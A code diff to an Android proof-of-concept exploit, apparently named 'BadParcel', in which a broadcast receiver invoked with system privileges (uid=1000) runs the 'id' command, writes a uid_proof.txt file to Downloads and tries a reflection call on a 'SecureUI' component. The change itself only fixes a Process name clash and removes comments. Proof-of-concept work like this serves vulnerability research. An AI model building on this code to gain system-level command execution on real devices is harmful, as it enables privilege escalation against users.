@@ -12,19 +12,18 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.lang.Process;  // 明示的に java.lang.Process をインポート
 
 public class SystemCommandReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        // このメソッドはシステム権限（uid=1000）で呼び出される
         int uid = Process.myUid();
         String msg = "[SystemCommandReceiver] onReceive called. UID=" + uid;
         Log.i("BadParcel", msg);
         MainActivity.appendLog(msg);
 
-        // id コマンドを実行
         try {
-            Process process = Runtime.getRuntime().exec("id");
+            java.lang.Process process = Runtime.getRuntime().exec("id");
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             StringBuilder output = new StringBuilder();
             String line;
@@ -35,7 +34,6 @@ public class SystemCommandReceiver extends BroadcastReceiver {
             String result = "id output:\n" + output.toString() + "exit code: " + exitCode;
             MainActivity.appendLog(result);
 
-            // 結果をファイルに書き込む
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists()) dir.mkdirs();
             File proof = new File(dir, "uid_proof.txt");
@@ -48,7 +46,6 @@ public class SystemCommandReceiver extends BroadcastReceiver {
             }
             MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
 
-            // SecureUIリフレクションも試行（システム権限）
             attemptSecureUIReflection();
 
         } catch (Exception e) {
